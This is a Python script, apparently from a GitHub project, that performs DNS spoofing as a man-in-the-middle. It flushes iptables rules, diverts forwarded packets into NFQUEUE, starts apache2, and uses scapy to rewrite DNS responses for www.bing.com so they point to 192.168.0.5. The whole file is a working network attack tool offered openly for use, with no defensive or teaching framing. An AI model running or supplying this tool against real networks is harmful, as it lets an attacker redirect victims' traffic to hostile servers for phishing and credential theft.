#!/usr/bin/env python

### sudo iptables -I FORWARD  -j NFQUEUE --queue-num  0
### sudo iptables --flush
# sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0  : to test on loal host
# sudo iptables -I INPUT -j NFQUEUE --queue-num 0  : to test on loal host
#
# python program to spoof DNS as man in middle
# This code needs two dependencies: netfilterqueue and scapy which is available on python 2.7
# You need a linux system
# for more documentation visit my github page: github.com/nibrasmuhamed
# pull requests, always welcome
# code published under MIT LICENSE
# 		
# 				code contributed by: @nibrasmuhamed and @muhammednahil on Github


import netfilterqueue
import scapy.all as scapy
import os


def main():
	os.system("iptables --flush")
	os.system("iptables -I FORWARD  -j NFQUEUE --queue-num  0")
	# os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
	# os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
	pc_ip = os.system("hostname -I | awk '{print $1}'")
	os.system('service apache2 start')


	def process_packet(packet):
		scapy_packet = scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.DNSRR):
			qname = scapy_packet[scapy.DNSQR].qname
			if "www.bing.com" in qname:
				print("[+] Spoofing target")
				answer = scapy.DNSRR(rrname = qname, rdata = "192.168.0.5")
				scapy_packet[scapy.DNS].an = answer
				scapy_packet[scapy.DNS].ancount = 1
				
				del scapy_packet[scapy.IP].len 
				del scapy_packet[scapy.IP].chksum 
				del scapy_packet[scapy.UDP].chksum 
				del scapy_packet[scapy.UDP].len

				packet.set_payload(str(scapy_packet))

		packet.accept()

	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_packet)
	queue.run()

if __name__ == "__main__":
   main()